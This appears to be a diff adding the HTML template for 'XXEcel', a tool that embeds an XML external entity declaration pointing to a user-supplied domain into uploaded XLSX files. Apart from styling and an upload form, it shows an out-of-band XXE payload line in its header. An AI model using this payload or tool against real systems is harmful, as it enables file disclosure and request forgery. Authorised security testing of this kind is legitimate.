@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXEcel</title>
+    <style>
+        body {
+            background-color: black;
+            color: #00ff00;
+            font-family: "Courier New", Courier, monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #004400;
+            padding: 10px;
+            text-align: center;
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+
+        .menu {
+            width: 100%;
+            background-color: #002200;
+            display: flex;
+            justify-content: center;
+            padding: 10px;
+        }
+
+        .menu a {
+            color: #00ff00;
+            text-decoration: none;
+            margin: 0 15px;
+            font-size: 1.2em;
+        }
+
+        .menu a:hover {
+            color: #ffffff;
+        }
+
+        .content {
+            margin-top: 20px;
+            width: 80%;
+            max-width: 600px;
+            border: 2px solid #00ff00;
+            padding: 20px;
+            box-shadow: 0 0 10px #00ff00;
+        }
+
+        form label, form input, form textarea, form button {
+            display: block;
+            width: 100%;
+            margin-bottom: 15px;
+        }
+
+        form label {
+            font-size: 1.1em;
+        }
+
+        form input, form textarea {
+            background-color: black;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 5px;
+            font-size: 1em;
+        }
+
+        form button {
+            background-color: black;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 10px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+
+        form button:hover {
+            background-color: #00ff00;
+            color: black;
+        }
+
+        .note {
+            font-size: 0.9em;
+            color: #00aa00;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">XXEcel by CalangosS</div>
+    <pre>
+        &lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt; &lt;!ENTITY % sp SYSTEM &quot;protocol://domain/entity.dtd&quot;&gt;%sp;%param1;&gt;]
+    </pre>
+    <div class="content">
+        {% if page == "generate" %}
+        <h2>Generate modified file with external entity</h2>
+        
+        <form action="/upload" method="post" enctype="multipart/form-data">
+            <label for="file">Upload XLSX File:</label>
+            <input type="file" name="file" id="file" accept=".xlsx" required>
+
+            <label for="domain">Enter Domain:</label>
+            <input type="text" name="domain" id="domain" placeholder="https://domain.com" required>
+
+            <label for="custom_content">Custom DOCTYPE Content (Optional):</label>
+            <textarea name="custom_content" id="custom_content" placeholder="Enter custom DOCTYPE content here..." rows="4"></textarea>
+
+            <button type="submit">Download</button>
+        </form>
+        {% endif %}
+        
+    </div>
+</body>
+</html>
